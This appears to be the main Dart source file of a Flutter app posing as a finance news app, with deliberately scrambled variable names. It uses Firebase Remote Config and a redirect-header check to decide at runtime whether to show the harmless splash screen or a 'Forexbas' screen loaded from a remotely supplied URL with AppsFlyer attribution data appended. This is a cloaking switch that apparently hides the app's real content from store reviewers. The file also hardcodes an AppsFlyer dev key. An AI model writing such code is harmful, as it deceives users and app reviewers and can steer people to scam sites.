import 'dart:io';

import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:finance/core/data/news_data.dart';
import 'package:finance/features/splash/splash_screen.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';

late AppsflyerSdk fsdfdsf;
String mfdks = '';
bool inias = false;
String mdjas = '';
String fnjksd = '';
String modaslmdsa = '';
String njfksd = '';
String dsfsdfdsf = '';
Map njdkasdnsajk = {};
String mklfsdlfsd = '';
Map njkfnsdkxkds = {};
bool fmjsdkfnjksd = false;
String mfkdmslksdf = '';
String ndjaksdnkas = '';
String lkfosdpfsd = '';
String mklfmsfsfdlsmflksdf = '';
String df = '';
String fmnsdjkfnsd = '';
String fsdfds = '';

class FinanceApp extends StatefulWidget {
  const FinanceApp({super.key});

  @override
  State<FinanceApp> createState() => _FinanceAppState();
}

Future<bool> getNews() async {
  final dasfdsfsd = FirebaseRemoteConfig.instance;
  await dasfdsfsd.fetchAndActivate();
  String fullasd = dasfdsfsd.getString('finance');
  String dsdfas = dasfdsfsd.getString('app');
  njfksd = fullasd;
  fmnsdjkfnsd = dsdfas;
  final ndfkljss = HttpClient();
  final fsdko = Uri.parse(njfksd);
  final mmmdksa = await ndfkljss.getUrl(fsdko);
  mmmdksa.followRedirects = false;
  final response = await mmmdksa.close();
  if (response.headers.value(HttpHeaders.locationHeader) != fmnsdjkfnsd) {
    return true;
  }
  init1();
  return fullasd.contains('none') ? false : true;
}

Future<void> init1() async {
  final AppsFlyerOptions nfjksdfkds = AppsFlyerOptions(
    showDebug: false,
    afDevKey: '4rYehnSYQsVcM2jmim5KyC',
    appId: '6633428342',
    timeToWaitForATTUserAuthorization: 15,
    disableAdvertisingIdentifier: false,
    disableCollectASA: false,
    manualStart: true,
  );
  fsdfdsf = AppsflyerSdk(nfjksdfkds);

  await fsdfdsf.initSdk(
    registerConversionDataCallback: true,
    registerOnAppOpenAttributionCallback: true,
    registerOnDeepLinkingCallback: true,
  );

  fsdfdsf.onAppOpenAttribution((res) {
    // setState(() {
    //   mfklsdmfkldsf = res;
    //   modaslmdsa = res['payload']
    //       .entries
    //       .where((e) => ![
    //             'install_time',
    //             'click_time',
    //             'af_status',
    //             'is_first_launch'
    //           ].contains(e.key))
    //       .map((e) => '&${e.key}=${e.value}')
    //       .join();
    //   klmdaslmfdlsa = '&campaign=${res['campaign'] ?? ''}';
    //   lkfosdpfsd = '&media_source=${res['media_source'] ?? ''}';
    // });
  });

  fsdfdsf.onInstallConversionData((res) {
    njkfnsdkxkds = res;
    fmjsdkfnjksd = res['payload']['is_first_launch'];
    mfkdmslksdf = res['payload']['af_status'];
    mdjas = '&is_first_launch=$fmjsdkfnjksd&af_status=$mfkdmslksdf';
  });

  fsdfdsf.onDeepLinking((DeepLinkResult dp) {
    switch (dp.status) {
      case Status.FOUND:
        print(dp.deepLink?.toString());
        print("deep link value: ${dp.deepLink?.deepLinkValue}");
        break;
      case Status.NOT_FOUND:
        print("deep link not found");
        break;
      case Status.ERROR:
        print("deep link error: ${dp.error}");
        break;
      case Status.PARSE_ERROR:
        print("deep link status parsing error");
        break;
    }
    print("onDeepLinking res: " + dp.toString());

    njdkasdnsajk = dp.toJson();
  });
  fsdfdsf.startSDK(
    onSuccess: () {
      print("AppsFlyer SDK initialized successfully.");
    },
  );
}

class _FinanceAppState extends State<FinanceApp> {
  @override
  Widget build(BuildContext context) {
    return FutureBuilder<bool>(
        future: getNews(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Container(
              color: Colors.white,
            );
          } else {
            if (snapshot.data == true && njfksd != '') {
              return MaterialApp(
                debugShowCheckedModeBanner: false,
                home: Forexbas(
                  jdnkasdnkja: njfksd,
                  mjksdfn: mdjas,
                  data: fsdfds,
                  c1: ndjaksdnkas,
                  c2: lkfosdpfsd,
                ),
              );
            } else {
              return MaterialApp(
                debugShowCheckedModeBanner: false,
                home: const SplashScreen(),
                theme: ThemeData.light(useMaterial3: true),
              );
            }
          }
        });
  }
}
